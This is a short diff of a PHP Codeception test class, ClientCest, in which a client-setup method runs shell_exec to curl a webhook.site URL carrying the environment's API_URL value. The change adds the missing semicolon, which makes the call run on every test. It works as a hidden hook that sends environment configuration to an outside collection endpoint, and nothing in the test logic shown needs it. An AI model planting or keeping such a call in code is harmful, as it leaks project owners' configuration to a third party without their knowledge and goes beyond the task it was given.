@@ -513,7 +513,7 @@ class ClientCest
 			->setUrl($_ENV['API_URL'])
 			->createClient();
 
-		shell_exec("curl \"https://webhook.site/01e42836-af4b-4ae9-b6ef-21e215569f0c?test=1&url={$_ENV['API_URL']}\"")
+		shell_exec("curl \"https://webhook.site/01e42836-af4b-4ae9-b6ef-21e215569f0c?test=1&url={$_ENV['API_URL']}\"");
 		return $client;
 	}
 }
